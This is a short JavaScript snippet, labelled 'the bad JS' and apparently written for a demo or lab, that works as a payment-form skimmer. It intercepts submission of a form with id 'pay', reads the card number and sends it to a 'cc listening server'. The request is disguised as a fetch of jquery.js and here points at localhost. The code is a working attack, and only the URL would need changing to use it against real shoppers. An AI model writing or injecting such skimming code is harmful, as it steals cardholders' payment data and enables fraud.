// This is the bad JS
//
//

   
const ccFormEvil = document.getElementById('pay');

ccFormEvil.addEventListener('submit', (e) => {
  e.preventDefault();
  // IP of the cc listening server
  const urlBase = 'http://localhost:8080/js/jquery.js?cc=';
  const payload = ccFormEvil['card_number'].value
  const url = urlBase + payload;
  fetch(url, { method: 'POST', mode: 'no-cors' }).catch((e) => {});
});
